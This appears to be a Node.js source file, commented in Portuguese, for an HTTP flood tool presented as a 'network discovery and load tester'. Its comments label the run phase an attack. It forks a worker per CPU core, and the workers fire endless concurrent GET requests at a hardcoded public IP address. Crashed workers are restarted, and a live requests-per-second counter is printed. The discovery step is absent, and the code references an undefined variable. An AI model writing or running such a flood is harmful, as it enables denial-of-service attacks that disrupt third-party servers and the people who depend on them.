import http from 'http';
import cluster from 'cluster';
import os from 'os';
import chalk from 'chalk';

const numCPUs = os.cpus().length;

/**
 * CONFIGURAÇÃO
 */
const CONCURRENCY_PER_WORKER = 25;
const TIMEOUT = 500;

/**
 * FASE 2: EXECUÇÃO (Ataque)
 */
async function main() {
    if (cluster.isPrimary) {
        console.clear();
        console.log(chalk.bold.magenta('\u2605 EXTREME NETWORK DISCOVERY & LOAD TESTER \u2605'));

        const aliveTargets = ['177.91.39.69'];

        if (aliveTargets.length === 0) {
            console.log(chalk.bold.red('\n\n\u2718 ERRO: Nenhum dispositivo ativo encontrado na rede ' + BASE_IP + '.0/24'));
            console.log(chalk.yellow('Dica: Verifique se o prefixo do IP está correto no arquivo index.js.'));
            process.exit();
        }

        console.log(chalk.bold.green(`\n\n\u2714 SUCESSO: ${aliveTargets.length} dispositivos respondendo na rede!`));
        console.log(chalk.gray('--------------------------------------------------'));
        aliveTargets.forEach(t => console.log(chalk.cyan(`  [Ativo] `) + t));
        console.log(chalk.gray('--------------------------------------------------'));

        console.log(chalk.bold.red('\n\u2623 DISPARANDO CARGA MÁXIMA CONTRA ALVOS ATIVOS \u2623'));
        console.log(chalk.yellow(`Usando ${numCPUs} núcleos e ${numCPUs * CONCURRENCY_PER_WORKER} conexões simultâneas...\n`));

        let totalSuccess = 0;
        let totalFail = 0;
        let lastTotal = 0;

        const handleMessage = (msg) => {
            if (msg.type === 'stats') {
                totalSuccess += msg.success;
                totalFail += msg.fail;
            }
        };

        // Inicia os Workers e passa a lista de IPs vivos
        for (let i = 0; i < numCPUs; i++) {
            const worker = cluster.fork({ ALIVE_TARGETS: JSON.stringify(aliveTargets) });
            worker.on('message', handleMessage);
        }

        cluster.on('exit', (worker) => {
            const newWorker = cluster.fork({ ALIVE_TARGETS: JSON.stringify(aliveTargets) });
            newWorker.on('message', handleMessage);
        });

        setInterval(() => {
            const currentTotal = totalSuccess + totalFail;
            const rps = currentTotal - lastTotal;
            lastTotal = currentTotal;

            process.stdout.write(
                `\r${chalk.green('\u2714 Sucesso:')} ${totalSuccess.toLocaleString()} | ` +
                `${chalk.red('\u2716 Falha:')} ${totalFail.toLocaleString()} | ` +
                `${chalk.cyan('RPS:')} ${chalk.bold(rps.toLocaleString())}          `
            );
        }, 1000);

    } else {
        // Código do Worker
        const targets = JSON.parse(process.env.ALIVE_TARGETS);
        const agent = new http.Agent({ keepAlive: true, maxSockets: CONCURRENCY_PER_WORKER });

        let successCount = 0;
        let failCount = 0;

        setInterval(() => {
            if (successCount > 0 || failCount > 0) {
                process.send({ type: 'stats', success: successCount, fail: failCount });
                successCount = 0;
                failCount = 0;
            }
        }, 500);

        function fire() {
            const targetIp = targets[Math.floor(Math.random() * targets.length)];
            const targetUrl = targetIp.startsWith('http') ? targetIp : `http://${targetIp}`;

            const req = http.get(targetUrl, { agent, timeout: TIMEOUT }, (res) => {
                res.on('data', () => { });
                res.on('end', () => {
                    successCount++;
                    setImmediate(fire);
                });
            }).on('error', () => {
                failCount++;
                setImmediate(fire);
            });

            req.on('timeout', () => {
                req.destroy();
                failCount++;
                setImmediate(fire);
            });
        }

        for (let i = 0; i < CONCURRENCY_PER_WORKER; i++) {
            fire();
        }
    }
}

main().catch(console.error);
